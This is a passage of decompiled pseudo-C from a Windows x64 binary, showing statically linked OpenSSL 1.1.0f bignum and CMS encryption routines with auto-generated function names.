               || (*(unsigned int (__fastcall **)(__int64 *, _QWORD *, int *))(*a1 + 192))(a1, v13, v7))
              && (*(unsigned int (__fastcall **)(__int64 *, _QWORD *, _QWORD *, _QWORD *, int *))(*a1 + 176))(
                   a1,
                   v14,
                   v14,
                   v13,
                   v7) )
            {
              v17 = 0i64;
              if ( a4 )
              {
                v18 = a6;
                v19 = a5 - (_QWORD)a6;
                while ( (unsigned int)sub_1400B1310(a1, (__int64)v13, *v18, *(__int64 *)((char *)v18 + v19), v7)
                     && (!sub_1400270E0(*v18)
                      || (*(unsigned int (__fastcall **)(__int64 *, _QWORD *, int *))(*a1 + 192))(a1, v13, v7))
                     && (*(unsigned int (__fastcall **)(__int64 *, _QWORD *, _QWORD *, _QWORD *, int *))(*a1 + 176))(
                          a1,
                          v14,
                          v14,
                          v13,
                          v7) )
                {
                  v19 = a5 - (_QWORD)a6;
                  ++v17;
                  ++v18;
                  if ( v17 >= a4 )
                    goto LABEL_23;
                }
              }
              else
              {
LABEL_23:
                if ( (unsigned int)sub_140022150(a2, v14) )
                  v8 = 1;
              }
            }
          }
        }
      }
    }
    sub_1400222C0(v13);
    sub_1400222C0(v14);
    sub_140027BE0(v20);
    return (int *)v8;
  }
  return result;
}
// 1400B1730: using guessed type __int64 arg_20;

//----- (00000001400B19A0) ----------------------------------------------------
_BOOL8 __fastcall sub_1400B19A0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, int *a7)
{
  BOOL v11; // r14d
  _QWORD *v12; // r13
  _QWORD *v13; // r15

  v11 = 0;
  sub_140027D40(a7);
  v12 = sub_140027C40(a7);
  v13 = sub_140027C40(a7);
  if ( v13
    && sub_140026E90((__int64)v12, a2)
    && (*(unsigned int (__fastcall **)(__int64, __int64, __int64, __int64, int *))(*(_QWORD *)a1 + 264i64))(
         a1,
         a3,
         a3,
         a6,
         a7)
    && (*(unsigned int (__fastcall **)(__int64, __int64, __int64, __int64, int *))(*(_QWORD *)a1 + 264i64))(
         a1,
         a4,
         a4,
         a5,
         a7)
    && (*(unsigned int (__fastcall **)(__int64, _QWORD *, __int64, __int64, int *))(*(_QWORD *)a1 + 264i64))(
         a1,
         v13,
         a3,
         a4,
         a7)
    && (unsigned int)sub_14007A380(a4, a4, a3)
    && (*(unsigned int (__fastcall **)(__int64, __int64, __int64, int *))(*(_QWORD *)a1 + 272i64))(a1, a4, a4, a7)
    && (*(unsigned int (__fastcall **)(__int64, __int64, __int64, _QWORD *, int *))(*(_QWORD *)a1 + 264i64))(
         a1,
         a3,
         a4,
         v12,
         a7) )
  {
    v11 = sub_14007A380(a3, a3, (__int64)v13) != 0;
  }
  sub_140027B60((__int64)a7);
  return v11;
}

//----- (00000001400B1B10) ----------------------------------------------------
_BOOL8 __fastcall sub_1400B1B10(_QWORD *a1, __int64 a2, __int64 a3, int *a4)
{
  BOOL v8; // r14d
  _QWORD *v9; // rsi

  v8 = 0;
  sub_140027D40(a4);
  v9 = sub_140027C40(a4);
  if ( v9
    && (*(unsigned int (__fastcall **)(_QWORD *, __int64, __int64, int *))(*a1 + 272i64))(a1, a2, a2, a4)
    && (*(unsigned int (__fastcall **)(_QWORD *, _QWORD *, __int64, int *))(*a1 + 272i64))(a1, v9, a3, a4)
    && (*(unsigned int (__fastcall **)(_QWORD *, __int64, __int64, _QWORD *, int *))(*a1 + 264i64))(a1, a3, a2, v9, a4)
    && (*(unsigned int (__fastcall **)(_QWORD *, __int64, __int64, int *))(*a1 + 272i64))(a1, a2, a2, a4)
    && (*(unsigned int (__fastcall **)(_QWORD *, _QWORD *, _QWORD *, int *))(*a1 + 272i64))(a1, v9, v9, a4)
    && (*(unsigned int (__fastcall **)(_QWORD *, _QWORD *, _QWORD, _QWORD *, int *))(*a1 + 264i64))(
         a1,
         v9,
         a1[13],
         v9,
         a4) )
  {
    v8 = sub_14007A380(a2, a2, (__int64)v9) != 0;
  }
  sub_140027B60((__int64)a4);
  return v8;
}

//----- (00000001400B1C50) ----------------------------------------------------
__int64 __fastcall sub_1400B1C50(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        __int64 a5,
        __int64 a6,
        __int64 a7,
        int *a8)
{
  unsigned int v11; // r12d
  __int64 result; // rax
  _QWORD *v13; // r13
  _QWORD *v14; // rbp
  _QWORD *v15; // rax
  _QWORD *v16; // [rsp+30h] [rbp-48h]

  v11 = 0;
  if ( sub_140027160(a5) )
  {
    sub_140027560(a6, 0i64);
    sub_140027560(a7, 0i64);
    return 1i64;
  }
  else if ( sub_140027160(a7) )
  {
    result = (__int64)sub_140026E90(a6, a2);
    if ( result )
      return (unsigned int)sub_14007A380(a7, a2, a3) != 0 ? 2 : 0;
  }
  else
  {
    sub_140027D40(a8);
    v13 = sub_140027C40(a8);
    v14 = sub_140027C40(a8);
    v15 = sub_140027C40(a8);
    v16 = v15;
    if ( v15
      && (unsigned int)sub_140027560((__int64)v15, 1i64)
      && (*(unsigned int (__fastcall **)(__int64, _QWORD *, __int64, __int64, int *))(*(_QWORD *)a1 + 264i64))(
           a1,
           v13,
           a5,
           a7,
           a8)
      && (*(unsigned int (__fastcall **)(__int64, __int64, __int64, __int64, int *))(*(_QWORD *)a1 + 264i64))(
           a1,
           a5,
           a5,
           a2,
           a8)
      && (unsigned int)sub_14007A380(a5, a5, a4)
      && (*(unsigned int (__fastcall **)(__int64, __int64, __int64, __int64, int *))(*(_QWORD *)a1 + 264i64))(
           a1,
           a7,
           a7,
           a2,
           a8)
      && (*(unsigned int (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)a1 + 264i64))(a1, a4, a7)
      && (unsigned int)sub_14007A380(a7, a7, a6)
      && (*(unsigned int (__fastcall **)(__int64, __int64, __int64, __int64, int *))(*(_QWORD *)a1 + 264i64))(
           a1,
           a7,
           a7,
           a5,
           a8)
      && (*(unsigned int (__fastcall **)(__int64, _QWORD *, __int64, int *))(*(_QWORD *)a1 + 272i64))(a1, v14, a2, a8)
      && (unsigned int)sub_14007A380((__int64)v14, (__int64)v14, a3)
      && (*(unsigned int (__fastcall **)(__int64, _QWORD *, _QWORD *, _QWORD *, int *))(*(_QWORD *)a1 + 264i64))(
           a1,
           v14,
           v14,
           v13,
           a8)
      && (unsigned int)sub_14007A380((__int64)v14, (__int64)v14, a7)
      && (*(unsigned int (__fastcall **)(__int64, _QWORD *, _QWORD *, __int64, int *))(*(_QWORD *)a1 + 264i64))(
           a1,
           v13,
           v13,
           a2,
           a8)
      && (*(unsigned int (__fastcall **)(__int64, _QWORD *, _QWORD *, _QWORD *, int *))(*(_QWORD *)a1 + 280i64))(
           a1,
           v13,
           v16,
           v13,
           a8)
      && (*(unsigned int (__fastcall **)(__int64, _QWORD *, _QWORD *, _QWORD *, int *))(*(_QWORD *)a1 + 264i64))(
           a1,
           v14,
           v13,
           v14,
           a8)
      && (*(unsigned int (__fastcall **)(__int64, __int64, __int64, _QWORD *, int *))(*(_QWORD *)a1 + 264i64))(
           a1,
           a6,
           a4,
           v13,
           a8)
      && (unsigned int)sub_14007A380(a7, a6, a2)
      && (*(unsigned int (__fastcall **)(__int64, __int64, __int64, _QWORD *, int *))(*(_QWORD *)a1 + 264i64))(
           a1,
           a7,
           a7,
           v14,
           a8)
      && (unsigned int)sub_14007A380(a7, a7, a3) )
    {
      v11 = 2;
    }
    sub_140027B60((__int64)a8);
    return v11;
  }
  return result;
}

//----- (00000001400B1FF0) ----------------------------------------------------
void __fastcall sub_1400B1FF0(__int64 a1)
{
  if ( a1 )
  {
    sub_140026FF0((_DWORD *)a1);
    sub_140026FF0((_DWORD *)(a1 + 24));
    if ( (*(_BYTE *)(a1 + 56) & 1) != 0 )
      sub_14001D930((void *)a1);
  }
}

//----- (00000001400B2040) ----------------------------------------------------
void __fastcall sub_1400B2040(_QWORD *a1)
{
  *a1 = 0i64;
  a1[1] = 0i64;
  a1[2] = 0i64;
  a1[3] = 0i64;
  a1[4] = 0i64;
  a1[5] = 0i64;
  a1[6] = 0i64;
  a1[7] = 0i64;
  sub_140027B10((__int64)a1);
  sub_140027B10((__int64)(a1 + 3));
}

//----- (00000001400B2090) ----------------------------------------------------
__int64 __fastcall sub_1400B2090(__int64 a1, __int64 a2)
{
  __int64 result; // rax

  result = (__int64)sub_140026E90(a1, a2);
  if ( result )
  {
    sub_140027560(a1 + 24, 0i64);
    *(_DWORD *)(a1 + 48) = sub_140027260(a2);
    result = 1i64;
    *(_DWORD *)(a1 + 52) = 0;
  }
  return result;
}

//----- (00000001400B20F0) ----------------------------------------------------
__int64 __fastcall sub_1400B20F0(_QWORD *a1, _QWORD *a2, __int64 a3, __int64 a4, int *a5)
{
  unsigned int v9; // r12d
  _QWORD *v10; // r15
  int v12; // esi
  int v13; // esi
  int v14; // eax
  _QWORD *v15; // [rsp+60h] [rbp+8h]

  v9 = 0;
  sub_140027D40(a5);
  v15 = sub_140027C40(a5);
  v10 = sub_140027C40(a5);
  if ( !a1 )
    a1 = sub_140027C40(a5);
  if ( !a2 )
    a2 = sub_140027C40(a5);
  if ( !v15 || !v10 || !a1 || !a2 )
  {
LABEL_31:
    sub_140027B60((__int64)a5);
    return v9;
  }
  if ( (int)sub_140027600((__int64 *)a3, (__int64 *)a4) >= 0 )
  {
    v12 = sub_140027260(a3);
    if ( 2 * *(_DWORD *)(a4 + 48) > v12 )
      v12 = 2 * *(_DWORD *)(a4 + 48);
    if ( v12 != *(_DWORD *)(a4 + 52) )
      *(_DWORD *)(a4 + 52) = sub_1400B2430((_QWORD *)(a4 + 24), a4, v12, a5);
    if ( *(_DWORD *)(a4 + 52) != -1 )
    {
      if ( (unsigned int)sub_140047090((__int64)v15, a3, *(_DWORD *)(a4 + 48)) )
      {
        if ( (unsigned int)sub_14006E5B0((__int64)v10, (__int64)v15, a4 + 24, a5) )
        {
          if ( (unsigned int)sub_140047090((__int64)a1, (__int64)v10, v12 - *(_DWORD *)(a4 + 48)) )
          {
            *((_DWORD *)a1 + 4) = 0;
            if ( (unsigned int)sub_14006E5B0((__int64)v10, a4, (__int64)a1, a5) )
            {
              if ( (unsigned int)sub_140041C70((__int64)a2, a3, (__int64)v10) )
              {
                *((_DWORD *)a2 + 4) = 0;
                v13 = 0;
                if ( (int)sub_140027600(a2, (__int64 *)a4) < 0 )
                {
LABEL_28:
                  if ( !sub_140027160((__int64)a2) )
                    v9 = *(_DWORD *)(a3 + 16);
                  *((_DWORD *)a2 + 4) = v9;
                  v9 = 1;
                  *((_DWORD *)a1 + 4) = *(_DWORD *)(a4 + 16) ^ *(_DWORD *)(a3 + 16);
                }
                else
                {
                  while ( 1 )
                  {
                    v14 = v13++;
                    if ( v14 > 2 )
                      break;
                    if ( !(unsigned int)sub_140041C70((__int64)a2, (__int64)a2, a4)
                      || !(unsigned int)sub_14003E600((__int64)a1, 1ui64) )
                    {
                      goto LABEL_31;
                    }
                    if ( (int)sub_140027600(a2, (__int64 *)a4) < 0 )
                      goto LABEL_28;
                  }
                  sub_140024610(3, 130, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_recp.c", 154);
                }
              }
            }
          }
        }
      }
    }
    goto LABEL_31;
  }
  sub_140027560((__int64)a1, 0i64);
  if ( sub_140026E90((__int64)a2, a3) )
  {
    sub_140027B60((__int64)a5);
    return 1i64;
  }
  else
  {
    sub_140027B60((__int64)a5);
    return 0i64;
  }
}

//----- (00000001400B2360) ----------------------------------------------------
__int64 __fastcall sub_1400B2360(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4, int *a5)
{
  unsigned int v9; // r14d
  _QWORD *v10; // rax
  __int64 v11; // rsi

  v9 = 0;
  sub_140027D40(a5);
  v10 = sub_140027C40(a5);
  v11 = (__int64)v10;
  if ( v10 )
  {
    if ( !a3 )
    {
      v11 = a2;
LABEL_9:
      v9 = sub_1400B20F0(0i64, a1, v11, a4, a5);
      goto LABEL_10;
    }
    if ( a2 == a3 )
    {
      if ( (unsigned int)sub_14006F810((__int64)v10, a2, a5) )
        goto LABEL_9;
    }
    else if ( (unsigned int)sub_14006E5B0((__int64)v10, a2, a3, a5) )
    {
      goto LABEL_9;
    }
  }
LABEL_10:
  sub_140027B60((__int64)a5);
  return v9;
}

//----- (00000001400B2430) ----------------------------------------------------
__int64 __fastcall sub_1400B2430(_QWORD *a1, __int64 a2, int a3, int *a4)
{
  unsigned int v8; // edi
  _QWORD *v9; // rax
  __int64 v10; // rsi

  v8 = -1;
  sub_140027D40(a4);
  v9 = sub_140027C40(a4);
  v10 = (__int64)v9;
  if ( v9 && (unsigned int)sub_140027480((__int64)v9, a3) && (unsigned int)sub_140041D70(a1, 0i64, v10, a2, a4) )
    v8 = a3;
  sub_140027B60((__int64)a4);
  return v8;
}

//----- (00000001400B24D0) ----------------------------------------------------
__int64 __fastcall sub_1400B24D0(__int64 *a1, int *a2)
{
  __int64 result; // rax
  __int64 *v5; // r14
  __int64 v6; // rax
  int **v7; // rax
  int **v8; // rbp
  int v9; // ebx
  int v10; // eax
  int v11; // eax
  int v12; // eax
  bool v13; // zf
  __int64 v14; // [rsp+60h] [rbp+18h] BYREF

  result = sub_1400B27C0(a1);
  v5 = (__int64 *)result;
  if ( result )
  {
    v6 = *(_QWORD *)result;
    if ( v6 && (*(_BYTE *)(v6 + 16) & 0x20) != 0 )
    {
      v7 = sub_140029B70(a2, 1025);
      v8 = v7;
      if ( !v7 )
      {
        sub_140024610(46, 110, 105, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_lib.c", 119);
        return 0i64;
      }
      v9 = sub_140029A90(v7, 3u, 0, (__int64)&v14);
      sub_14002A400((__int64)v8, 512);
      sub_140029A90(v8, 0x82u, 0, 0i64);
      sub_1400476D0(*v5, v14, v9);
      *(_DWORD *)(*v5 + 16) &= ~0x20u;
    }
    v10 = sub_14002C260(*a1);
    if ( v10 > 25 )
    {
      if ( v10 != 26 )
      {
        v13 = v10 == 786;
        goto LABEL_16;
      }
    }
    else
    {
      if ( v10 == 25 )
        return sub_1400BF350((__int64)a1, a2, 0);
      v11 = v10 - 21;
      if ( v11 )
      {
        v12 = v11 - 1;
        if ( !v12 )
          return sub_14007F850(a1, a2);
        v13 = v12 == 1;
LABEL_16:
        if ( !v13 )
        {
          sub_140024610(46, 110, 156, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_lib.c", 146);
          return 0i64;
        }
      }
    }
    return 1i64;
  }
  return result;
}

//----- (00000001400B2660) ----------------------------------------------------
_QWORD *__fastcall sub_1400B2660(__int64 *a1, __int64 a2)
{
  __int64 v4; // rbx
  __int64 *v5; // rax
  __int64 v6; // rcx
  void *v7; // rax
  __int64 *v8; // rax
  int v9; // eax
  int v10; // eax
  int v11; // eax
  int v12; // eax
  _QWORD *v13; // rax

  if ( a2 )
  {
    v4 = a2;
    goto LABEL_11;
  }
  v5 = (__int64 *)sub_1400B27C0(a1);
  if ( !v5 )
  {
LABEL_27:
    sub_140024610(46, 111, 127, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_lib.c", 64);
    return 0i64;
  }
  v6 = *v5;
  if ( !*v5 )
  {
    v7 = sub_1400BEE00();
LABEL_9:
    v8 = sub_140029FE0((__int64)v7);
    goto LABEL_10;
  }
  if ( *(_DWORD *)(v6 + 16) == 32 )
  {
    v7 = sub_1400BEAF0();
    goto LABEL_9;
  }
  v8 = sub_1400BEA20(*(_BYTE **)(v6 + 8), *(_DWORD *)v6);
LABEL_10:
  v4 = (__int64)v8;
LABEL_11:
  if ( !v4 )
    goto LABEL_27;
  v9 = sub_14002C260(*a1) - 21;
  if ( !v9 )
    return (_QWORD *)v4;
  v10 = v9 - 1;
  if ( !v10 )
  {
    v13 = sub_14007F920(a1);
LABEL_22:
    if ( v13 )
      return sub_14002A140(v13, v4);
    if ( !a2 )
    {
      sub_140029BA0(v4);
      return 0i64;
    }
    return 0i64;
  }
  v11 = v10 - 1;
  if ( !v11 )
  {
    v13 = (_QWORD *)sub_14007E740((__int64)a1);
    goto LABEL_22;
  }
  v12 = v11 - 2;
  if ( !v12 )
  {
    v13 = (_QWORD *)sub_1400BF4B0((__int64)a1);
    goto LABEL_22;
  }
  if ( v12 == 1 )
  {
    v13 = (_QWORD *)sub_1400B2EB0((__int64)a1);
    goto LABEL_22;
  }
  sub_140024610(46, 111, 156, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_lib.c", 94);
  return 0i64;
}

//----- (00000001400B27C0) ----------------------------------------------------
__int64 __fastcall sub_1400B27C0(__int64 *a1)
{
  int v2; // eax
  int v3; // eax
  int v4; // eax
  _DWORD *v6; // rax

  v2 = sub_14002C260(*a1);
  if ( v2 <= 25 )
  {
    if ( v2 == 25 )
      goto LABEL_7;
    v3 = v2 - 21;
    if ( !v3 )
      return (__int64)(a1 + 1);
    v4 = v3 - 1;
    if ( !v4 )
    {
LABEL_7:
      v6 = *(_DWORD **)(a1[1] + 16);
      return (__int64)(v6 + 2);
    }
    if ( v4 == 1 )
      return *(_QWORD *)(a1[1] + 24) + 16i64;
LABEL_13:
    v6 = (_DWORD *)a1[1];
    if ( *v6 != 4 )
    {
      sub_140024610(46, 129, 152, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_lib.c", 184);
      return 0i64;
    }
    return (__int64)(v6 + 2);
  }
  if ( v2 == 26 )
    return *(_QWORD *)(a1[1] + 8) + 16i64;
  if ( v2 == 205 )
    return *(_QWORD *)(a1[1] + 40) + 8i64;
  if ( v2 != 786 )
    goto LABEL_13;
  return *(_QWORD *)(a1[1] + 24) + 8i64;
}

//----- (00000001400B28A0) ----------------------------------------------------
__int64 __fastcall sub_1400B28A0(_QWORD *a1, int *a2, _QWORD *a3)
{
  int v5; // edi
  int **v6; // rbx
  unsigned int *v7; // rax
  __int64 v8; // rax
  int *v9; // rax
  __int64 v11; // [rsp+48h] [rbp+10h] BYREF
  __int64 v12; // [rsp+58h] [rbp+20h] BYREF

  sub_1400673E0(&v12, 0i64, 0i64, a3);
  v5 = sub_14002C260(v12);
  v6 = sub_140029B70(a2, 520);
  if ( v6 )
  {
    while ( 1 )
    {
      sub_140029A90(v6, 0x78u, 0, (__int64)&v11);
      v7 = (unsigned int *)sub_1400252A0(v11);
      if ( (unsigned int)sub_14001D4F0(v7) == v5 )
        break;
      v8 = sub_1400252A0(v11);
      if ( (unsigned int)sub_140022000(v8) == v5 )
        break;
      v9 = (int *)sub_14002A130((__int64)v6);
      v6 = sub_140029B70(v9, 520);
      if ( !v6 )
        goto LABEL_5;
    }
    return sub_14006DDB0(a1, v11);
  }
  else
  {
LABEL_5:
    sub_140024610(46, 115, 131, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_lib.c", 324);
    return 0i64;
  }
}

//----- (00000001400B29A0) ----------------------------------------------------
__int64 __fastcall sub_1400B29A0(_QWORD *a1)
{
  __int64 v1; // rbx
  unsigned int v2; // eax
  char *v3; // rax
  __int64 v4; // rdi
  void *v5; // rax
  __int64 *v6; // rax
  __int64 v8; // [rsp+48h] [rbp+10h] BYREF

  v1 = 0i64;
  sub_1400673E0(&v8, 0i64, 0i64, a1);
  v2 = sub_14002C260(v8);
  v3 = sub_14002C1A0(v2);
  v4 = sub_14001E990((__int64)v3);
  if ( v4 )
  {
    v5 = sub_1400BF340();
    v6 = sub_140029FE0((__int64)v5);
    v1 = (__int64)v6;
    if ( v6 && (unsigned int)sub_140029A90(v6, 0x6Fu, 0, v4) )
      return v1;
    sub_140024610(46, 116, 119, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_lib.c", 300);
  }
  else
  {
    sub_140024610(46, 116, 149, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_lib.c", 295);
  }
  sub_140029BA0(v1);
  return 0i64;
}

//----- (00000001400B2A70) ----------------------------------------------------
__int64 __fastcall sub_1400B2A70(__int64 a1, __int64 *a2, _QWORD *a3, const void *a4, size_t a5)
{
  return sub_140094120(
           a1,
           a2,
           a3,
           a4,
           (unsigned int)a5,
           (void (__fastcall *)(__int64 *, __int64 *, __int64))sub_14008FA50);
}

//----- (00000001400B2AA0) ----------------------------------------------------
__int64 __fastcall sub_1400B2AA0(__int64 a1)
{
  __int64 v1; // rdi
  __int64 *v2; // rsi
  void *v3; // rbp
  char *Src; // r13
  __int64 v5; // r14
  int v6; // r12d
  void *v8; // rax
  __int64 *v9; // rax
  __int64 v10; // r15
  int *v11; // rax
  unsigned int v12; // eax
  char *v13; // rax
  unsigned int *v14; // rax
  unsigned int v15; // eax
  signed int NumTryBlocks; // eax
  int v17; // eax
  void *v18; // rax
  __int64 v19; // rax
  unsigned int *v20; // rcx
  __FrameHandler3::TryBlockMap *v22; // [rsp+30h] [rbp-58h] BYREF
  int v23; // [rsp+38h] [rbp-50h]
  int v24; // [rsp+3Ch] [rbp-4Ch]
  char v25[16]; // [rsp+40h] [rbp-48h] BYREF

  v1 = *(_QWORD *)(a1 + 24);
  v2 = *(__int64 **)(a1 + 8);
  v3 = 0i64;
  Src = 0i64;
  v24 = 0;
  v5 = 0i64;
  v6 = 0;
  v23 = v1 != 0;
  v8 = sub_1400BFD90();
  v9 = sub_140029FE0((__int64)v8);
  v10 = (__int64)v9;
  if ( !v9 )
  {
    sub_140024610(46, 120, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_enc.c", 41);
    return 0i64;
  }
  sub_140029A90(v9, 0x81u, 0, (__int64)&v22);
  if ( v1 )
  {
    v11 = *(int **)(a1 + 24);
    if ( *(_QWORD *)(a1 + 32) )
      *(_QWORD *)(a1 + 24) = 0i64;
  }
  else
  {
    v12 = sub_14002C260(*v2);
    v13 = sub_14002C1A0(v12);
    v11 = (int *)sub_14001E950((__int64)v13);
    if ( !v11 )
    {
      sub_140024610(46, 120, 148, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_enc.c", 58);
      goto LABEL_43;
    }
  }
  if ( (int)sub_14001B7A0(v22, v11, 0i64, 0i64, 0i64, v23) > 0 )
  {
    if ( v1 )
    {
      v14 = (unsigned int *)sub_140021BD0((__int64)v22);
      v15 = sub_140024FD0(v14);
      *v2 = (__int64)sub_14002C0F0(v15);
      NumTryBlocks = __FrameHandler3::TryBlockMap::getNumTryBlocks(v22);
      if ( NumTryBlocks > 0 )
      {
        if ( (int)sub_140025460((__int64)v25, NumTryBlocks) <= 0 )
          goto LABEL_43;
        Src = v25;
      }
    }
    else if ( (int)sub_140024D90((__int64)v22, v2[1]) <= 0 )
    {
      sub_140024610(46, 120, 102, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_enc.c", 81);
      goto LABEL_43;
    }
    v17 = sub_140024D30((__int64)v22);
    v5 = v17;
    if ( !v1 || !*(_QWORD *)(a1 + 32) )
    {
      v18 = sub_14001D8E0(v17);
      v3 = v18;
      if ( !v18 )
      {
        sub_140024610(46, 120, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_enc.c", 89);
        goto LABEL_43;
      }
      if ( (int)sub_14001B550((unsigned int *)v22, (__int64)v18) <= 0 )
        goto LABEL_43;
    }
    if ( !*(_QWORD *)(a1 + 32) )
    {
      *(_QWORD *)(a1 + 32) = v3;
      v3 = 0i64;
      *(_QWORD *)(a1 + 40) = v5;
      if ( v1 )
        v24 = 1;
      else
        sub_140023B90();
    }
    if ( *(_QWORD *)(a1 + 40) != v5 && (int)sub_14001B690(v22, *(_DWORD *)(a1 + 40)) <= 0 )
    {
      if ( v1 || *(_DWORD *)(a1 + 48) )
      {
        sub_140024610(46, 120, 118, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_enc.c", 116);
        goto LABEL_41;
      }
      sub_14001DA40(
        *(void **)(a1 + 32),
        *(_QWORD *)(a1 + 40),
        (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_enc.c",
        0x78u);
      *(_QWORD *)(a1 + 32) = v3;
      v3 = 0i64;
      *(_QWORD *)(a1 + 40) = v5;
      sub_140023B90();
    }
    if ( (int)sub_14001B7A0(v22, 0i64, 0i64, *(_QWORD *)(a1 + 32), Src, v23) > 0 )
    {
      if ( v1 )
      {
        v19 = sub_14004FF40();
        v2[1] = v19;
        if ( !v19 )
        {
          sub_140024610(46, 120, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_enc.c", 137);
          goto LABEL_41;
        }
        if ( (int)sub_140024EC0(v22, v19) <= 0 )
        {
          sub_140024610(46, 120, 102, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_enc.c", 142);
          goto LABEL_41;
        }
        v20 = (unsigned int *)v2[1];
        if ( *v20 == -1 )
        {
          sub_14004FF20(v20);
          v2[1] = 0i64;
        }
      }
      v6 = 1;
      goto LABEL_41;
    }
    sub_140024610(46, 120, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_enc.c", 131);
LABEL_41:
    if ( v24 && v6 )
      goto LABEL_44;
    goto LABEL_43;
  }
  sub_140024610(46, 120, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_enc.c", 65);
LABEL_43:
  sub_14001DA40(
    *(void **)(a1 + 32),
    *(_QWORD *)(a1 + 40),
    (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_enc.c",
    0x9Bu);
  *(_QWORD *)(a1 + 32) = 0i64;
LABEL_44:
  sub_14001DA40(v3, v5, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_enc.c", 0x9Eu);
  if ( v6 )
    return v10;
  sub_140029BA0(v10);
  return 0i64;
}

//----- (00000001400B2EB0) ----------------------------------------------------
__int64 __fastcall sub_1400B2EB0(__int64 a1)
{
  __int64 v1; // rax
  __int64 v2; // rcx

  v1 = *(_QWORD *)(a1 + 8);
  v2 = *(_QWORD *)(v1 + 8);
  if ( *(_QWORD *)(v2 + 24) && *(_QWORD *)(v1 + 16) )
    *(_DWORD *)v1 = 2;
  return sub_1400B2AA0(v2);
}

//----- (00000001400B2EF0) ----------------------------------------------------
__int64 __fastcall sub_1400B2EF0(__int64 a1, __int64 a2, int a3)
{
  __int64 v3; // rdi
  unsigned int v4; // ebp
  char *v5; // rbx
  __int64 v7; // r14
  __int64 *v9; // rsi
  void *v10; // rax
  __int64 *v11; // rax
  __int64 *v12; // r15
  unsigned int v13; // eax
  char *v14; // rax
  int *v15; // r13
  int *v16; // rax
  int *v17; // rsi
  unsigned __int64 v18; // r12
  int v19; // eax
  size_t v20; // rcx
  char *v21; // rax
  char *v22; // rax
  unsigned __int64 v23; // [rsp+60h] [rbp+8h] BYREF

  v3 = *(_QWORD *)(a2 + 8);
  v4 = 0;
  v5 = 0i64;
  v7 = *(_QWORD *)(*(_QWORD *)(a1 + 8) + 24i64);
  if ( !*(_QWORD *)(v3 + 32) )
  {
    sub_140024610(46, 167, 178, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_pwri.c", 292);
    return 0i64;
  }
  v9 = *(__int64 **)(v3 + 16);
  if ( !v9 || (unsigned int)sub_14002C260(*v9) != 893 )
  {
    sub_140024610(46, 167, 179, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_pwri.c", 299);
    return 0i64;
  }
  v10 = sub_1400673B0();
  v11 = (__int64 *)sub_14003F490((__int64)v10, v9[1]);
  v12 = v11;
  if ( !v11 )
  {
    sub_140024610(46, 167, 176, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_pwri.c", 308);
    return 0i64;
  }
  v13 = sub_14002C260(*v11);
  v14 = sub_14002C1A0(v13);
  v15 = (int *)sub_14001E950((__int64)v14);
  if ( !v15 )
  {
    sub_140024610(46, 167, 148, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_pwri.c", 315);
    return 0i64;
  }
  v16 = (int *)sub_14001B520();
  v17 = v16;
  if ( !v16 )
  {
    sub_140024610(46, 167, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_pwri.c", 321);
    return 0i64;
  }
  if ( (unsigned int)sub_14001B7A0(v16, v15, 0i64, 0i64, 0i64, a3) )
  {
    sub_14001B750((__int64)v17, 0);
    if ( (int)sub_140024D90((__int64)v17, v12[1]) < 0 )
    {
      sub_140024610(46, 167, 102, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_pwri.c", 330);
      goto LABEL_30;
    }
    if ( (int)sub_140035FD0(
                **(_QWORD **)(v3 + 8),
                *(_BYTE **)(v3 + 32),
                *(_DWORD *)(v3 + 40),
                *(_QWORD *)(*(_QWORD *)(v3 + 8) + 8i64),
                (__int64)v17,
                a3) < 0 )
    {
      sub_140024610(46, 167, 6, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_pwri.c", 341);
      goto LABEL_30;
    }
    if ( !a3 )
    {
      v22 = (char *)sub_14001D8E0(**(int **)(v3 + 24));
      v5 = v22;
      if ( !v22 )
      {
        sub_140024610(46, 167, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_pwri.c", 365);
        goto LABEL_30;
      }
      if ( !(unsigned int)sub_1400B3290(v22, &v23, *(char **)(*(_QWORD *)(v3 + 24) + 8i64), **(int **)(v3 + 24), v17) )
      {
        sub_140024610(46, 167, 180, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_pwri.c", 371);
        goto LABEL_30;
      }
      *(_QWORD *)(v7 + 40) = v23;
      *(_QWORD *)(v7 + 32) = v5;
LABEL_29:
      v4 = 1;
      goto LABEL_30;
    }
    v18 = *(_QWORD *)(v7 + 40);
    v19 = sub_140024CD0((__int64)v17);
